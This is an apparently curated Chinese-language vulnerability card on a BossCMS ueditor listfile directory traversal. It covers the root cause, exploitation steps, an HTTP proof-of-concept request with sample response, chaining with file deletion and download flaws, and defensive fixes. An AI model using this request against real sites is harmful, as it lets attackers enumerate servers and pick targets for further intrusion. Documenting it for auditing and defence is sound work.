---
id: web-generic-file-inclusion-bosscms-ueditor-listfile-folder-traversal
title: BossCMS ueditor listfile 目录遍历：folder 参数直拼 upload/ 后 opendir/readdir 列出任意目录
type: scenario
domain: web
path: web/generic/file-inclusion
technique: bosscms-ueditor-listfile-folder-directory-traversal
aliases:
- BossCMS 目录遍历
- ueditor listfile folder 穿越
- BossCMS 未授权列目录
tags:
- web
- php
- bosscms
- cms
- ueditor
- path-traversal
- directory-listing
- code-audit
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V638
  verified_at: '2026-11-13T02:11:49+08:00'
  notes: 已对照原文与截图核对：lists() 的 folder 参数直拼、dir::read() opendir/readdir、listfile() 调用 fileManagerListPath=upload/ 的链路属实；响应示例已按截图修正（4 级 ../、WWW/Extensions/COM/min000.exe/min000.dat、total:3）；正文 PoC folder=../../../ 与原文一致，实际级数按目录深度调整；affected_versions 已 clear（原文仅安装环境版本）。未复跑。
---

## 一句话结论

BossCMS 的 ueditor `action=listfile` 进入 `lists()` 时，`$folder` 直接取自 `$_GET['folder']`，拼到配置的 `fileManagerListPath`（`upload/`）后用 `dir::read()` 的 `opendir/readdir` 读取目录；`folder=../../../` 即可遍历列出 Web 根目录之外的文件与目录名，返回 JSON 列表（含文件名与相对 URL），可用于踩点与定位后续删除/下载目标。

## 原理

- **参数直拼**：`ueditor.class.php` 的 `lists($path,$start,$size)` 中 `$folder = arrExist($G, $_GET['folder'])`，随后 `$path = dir::replace($path.'/'.$folder)`。
- **校验缺位**：`dir::replace()` 只做分隔符替换（`\` → `/`、盘符占位符还原），不剔除 `..`、不做 canonical 校验；`$path` 因此可跳出 `upload/`。
- **读取实现**：`dir::read(ROOT_PATH.$path)` 在 `file_exists` 后 `opendir`/`readdir`，把目录项分为 `dir` 与 `file` 两组返回，列表项再拼出 `folder`、`dir` 布尔与 `url`。
- **调用链**：`controller.php?action=listfile` → `init()` 的 `fileManagerActionName` 分支 → `listfile()` → `lists($this->config['fileManagerListPath'],...)`；`fileManagerListPath` 在 `config.json` 中为 `upload/`。
- **鉴权**：ueditor 控制器继承 admin，`admin::init()` 未登录只 `header()` 跳转、不退出，未授权即可读取列表（与关联卡同源）。

## 触发条件

- 目标可达 `/system/extend/ueditor/php/controller.php?action=listfile`。
- 传入 `folder` 参数（GET），带 `../` 即可向上跳。
- 目标目录对 PHP 进程可读；`open_basedir` 等限制之外。

## 利用步骤

1. 直接请求 `action=listfile` 并令 `folder=../../../`，观察返回的 `list` 数组。
2. 根据返回的目录名逐层调整 `folder` 的 `../` 数量，枚举站点根、上级目录（原文枚举到 `D:/WWW/`、`Extensions/`、`COM/` 等）。
3. 用返回的文件名/相对 URL 选定后续目标（如配置文件、备份、安装锁），配合任意文件下载/删除接口利用。

## PoC

```http
GET /system/extend/ueditor/php/controller.php?action=listfile&folder=../../../ HTTP/1.1
Host: target
```

响应（按原文截图，`list` 节选；截图请求/响应中的层级为 4 级 `../`，正文 PoC 写作 3 级，实际级数按目标目录深度调整）：

```json
{"state":"SUCCESS","list":[
  {"folder":"..\/..\/..\/..\/WWW\/","dir":true,"url":"..\/upload\/..\/..\/..\/..\/WWW"},
  {"folder":"..\/..\/..\/..\/Extensions\/","dir":true,"url":"..\/upload\/..\/..\/..\/..\/Extensions"},
  {"folder":"..\/..\/..\/..\/COM\/","dir":true,"url":"..\/upload\/..\/..\/..\/..\/COM"},
  {"folder":"..\/..\/..\/..\/min000.exe","dir":false,"url":"..\/upload\/..\/..\/..\/..\/min000.exe"},
  {"folder":"..\/..\/..\/..\/min000.dat","dir":false,"url":"..\/upload\/..\/..\/..\/..\/min000.dat"}
],"start":0,"size":20,"total":3}
```

只泄露目录项名称/URL，不返回文件内容。

## 变体与关联

- 同一 `lists()` 还被图片列表 `listimage()` 与视频列表 `listvideo()` 调用，`folder` 参数同样可用；只是默认列出的根目录不同。
- 与任意文件删除（`action=delete`）、备份下载穿越（`id` 参数）组合可构成“列目录 → 定位 → 删除/下载”的完整链。
- 与库内其它目录遍历卡的区别：本卡是 ueditor 通用 `lists()` 的 `folder` 参数，过滤仅 `dir::replace()`。

## 检测与防御

- `folder` 参数白名单（只允许字母数字与有限子目录），或用 `realpath()` 校验结果仍在 `upload/` 内。
- 关闭或鉴权保护 ueditor 的 controller 入口；修复 `admin::init()` 的跳转不退出问题。
- 监控 `action=listfile` 请求中出现 `../`、绝对路径或非常规 folder 的调用。
